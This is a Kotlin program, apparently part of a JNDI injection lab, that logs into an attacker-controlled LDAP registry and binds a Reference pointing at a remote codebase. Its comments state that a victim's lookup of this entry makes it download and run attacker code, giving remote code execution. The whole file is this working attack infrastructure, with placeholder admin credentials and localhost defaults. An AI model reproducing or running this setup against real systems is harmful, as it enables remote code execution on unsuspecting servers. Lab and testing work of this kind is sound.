import java.util.Hashtable

import javax.naming.Context
import javax.naming.InitialContext

import javax.naming.Reference

import javax.naming.CommunicationException
import javax.naming.directory.InvalidAttributeValueException


// Default addresses to use in case none were specified at the command-line
val DEFAULT_ATTACKER_LDAP_REGISTRY_URL = "ldap://localhost:1389/dc=ldap-registry,dc=attacker"
val DEFAULT_ATTACKER_CODEBASE_URL      = "http://localhost:8080/"

fun main() {

    // What LDAP registry to use
    // This will point the victim to a class name and a factory to pass that
    //  name to. The factory will be invoked, causing RCE.
    val attacker_ldap_registry_url =
        System.getProperty("attacker-ldap-registry-url") ?: DEFAULT_ATTACKER_LDAP_REGISTRY_URL
    // Where the codebase is
    // The attacker must host the factory class somewhere, probably on an HTTP
    //  server. This is where the victim will download code from
    val attacker_codebase_url =
        System.getProperty("attacker-codebase-url") ?: DEFAULT_ATTACKER_CODEBASE_URL

    // Create a Hashtable for the configuration
    // Yes, it must be a Hashtable
    var env = Hashtable<String, String>()

    // Put the location of the registry we want to use for JNDI
    env.put(
        Context.PROVIDER_URL,
        attacker_ldap_registry_url)
    // Specify what the backend for JNDI should be
    // We're using LDAP
    env.put(
        Context.INITIAL_CONTEXT_FACTORY,
        "com.sun.jndi.ldap.LdapCtxFactory")
    // Authenticate as the administrator
    env.put(
        Context.SECURITY_AUTHENTICATION,
        "simple")
    env.put(
        Context.SECURITY_PRINCIPAL,
        "cn=admin,dc=ldap-registry,dc=attacker")
    env.put(
        Context.SECURITY_CREDENTIALS,
        "admin")

    // Construct a context using the helper function
    // The server might not be up when we first start this service, so we loop
    //  until we're able to connect. That's all the helper function does. Aside
    //  from the looping, it just does `InitialContext(env)`.
    var ctx: Context? = null
    while(ctx == null) {
        try {
            // The server might prematurely accept our connection
            // Resolve this in the most jank way possible - by sleeping. It
            //  takes about two seconds for the setup to finish on my computer,
            //  so sleep for five.
            ctx = InitialContext(env)
            println("Connected!")
            Thread.sleep(5000)

        } catch(_: CommunicationException) {
            println("Failed to connect.")
            println("Retrying after 1 second...")
            Thread.sleep(1000)
        }
    }

    // Add the reference to the registry
    // Use `rebind` instead of `bind` if something was already there from a
    //  previous run
    ctx.rebind(
        "cn=made-class",
        Reference("MadeClass", "FactoryClass", attacker_codebase_url)
    )

    // For good measure
    ctx.close()
}
